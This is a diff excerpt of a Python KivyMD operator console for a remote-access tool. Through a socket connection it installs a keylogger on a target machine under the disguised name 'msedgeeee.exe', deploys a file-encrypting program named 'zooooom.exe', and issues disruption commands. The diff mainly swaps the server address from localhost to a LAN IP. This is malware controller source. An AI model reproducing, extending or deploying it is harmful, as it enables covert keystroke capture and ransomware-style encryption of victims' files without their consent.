@@ -123,7 +123,6 @@ ScreenManager:
                     id: keyloggerstopBtn
                     text: "Key Logger Stop"
                     on_press: app.KeyloggerStop()
-
                 OneLineListItem:
                     id: encryptfilesBtn
                     text: "Encrypt Files"
@@ -157,9 +156,8 @@ ScreenManager:
         hint_text: 'Enter File Path'
 '''
 # Server IP and Port
-HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '192.168.123.165'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
-
 
 class Main(MDApp):
     def build(self):
@@ -501,7 +499,6 @@ class Main(MDApp):
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
-
             break
 
     # Zees Simple Disruptions
@@ -561,6 +558,7 @@ class Main(MDApp):
     def KeyloggerInstall(self):
         # Reset console
         self.root.ids.disruptConsoleField.text = ''
+        
         tpath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\msedgeeee.exe"
         kpath = os.path.join(os.getcwd(), "keylogger.exe")
         while True:
@@ -615,12 +613,10 @@ class Main(MDApp):
                 time.sleep(5)
                 o1 =f"Keylogger{output2}"
                 print(o1)
-                # Reset console
                 self.root.ids.disruptConsoleField.text = o1
             else:
                 o2 = "Keylogger already installed on target machine."
                 print(o2)
-                # Reset console
                 self.root.ids.disruptConsoleField.text = o2
             break
 
@@ -656,6 +652,7 @@ class Main(MDApp):
     def EncryptFiles(self):
         # Reset console
         self.root.ids.disruptConsoleField.text = ''
+        
         tpath = "%USERPROFILE%\\AppData\\Local\\Temp\\zooooom.exe"
         kpath = os.path.join(os.getcwd(), "encrypt.exe")
         while True:
@@ -723,14 +720,11 @@ class Main(MDApp):
     def MainMenu(self):
         self.root.current = "mainMenu"
 
-
 class DenyFilesContent(BoxLayout):
     pass
 
-
 class TaskKillContent(BoxLayout):
     pass
-
 
 if __name__ == '__main__':
     Main().run()
